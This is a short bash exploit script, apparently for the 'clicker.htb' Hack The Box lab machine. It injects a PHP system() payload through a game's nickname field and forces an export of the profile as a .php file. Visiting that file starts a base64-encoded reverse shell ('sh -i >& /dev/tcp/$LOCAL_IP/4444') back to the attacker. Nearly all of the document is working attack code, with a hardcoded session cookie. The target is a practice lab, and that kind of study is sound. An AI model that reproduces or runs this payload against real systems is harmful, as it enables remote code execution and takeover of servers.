#!/bin/bash

PHPSESSID="k002rk00q1d5v73c3nvjgabeie"
LOCAL_IP=$1
if [ -z $LOCAL_IP ]
then
    echo "./start-reverse-shell.sh <local-ip>"
    exit 1
fi
PAYLOAD="sh -i >& /dev/tcp/$LOCAL_IP/4444 0>&1"
P64=$(echo $PAYLOAD | base64)
PAYLOAD="echo $P64 | base64 -d |bash"
PAYLOAD_PHP="<?php system(\"$PAYLOAD\")?>"
PAYLOAD_URL_ENCODED=$(python3 -c $'try: import urllib.request as urllib\nexcept: import urllib\nimport sys\nsys.stdout.write(urllib.quote(input()))' <<< "$PAYLOAD_PHP")
# Store the reverse shell trigger in the nickname
curl -s -D /tmp/headers1.txt "http://clicker.htb/save_game.php?clicks=0&level=0&nickname=$PAYLOAD_URL_ENCODED" -H "Cookie: PHPSESSID=$PHPSESSID"
UPDATE_USER_MSG=$(cat /tmp/headers1.txt |grep Location| cut -d '=' -f 2 | tr -d '\n')
if [ "$UPDATE_USER_MSG" = "Game has been saved!" ]; then
    echo "Problem saving profile"
    cat /tmp/headers1.txt
    exit 1
fi

# Trigger the export, when visiting the exported page, the reverse shell will start
curl -s -D /tmp/headers2.txt 'http://clicker.htb/export.php' -X POST  -H 'Content-Type: application/x-www-form-urlencoded'  -H "Cookie: PHPSESSID=$PHPSESSID" --data-raw 'threshold=0&extension=php'
LOCATION=$(cat /tmp/headers2.txt |grep Location |  cut -d ' ' -f 7 | tr -d '[:space:]')
echo "Visit http://clicker.htb/$LOCATION to start the reverse shell"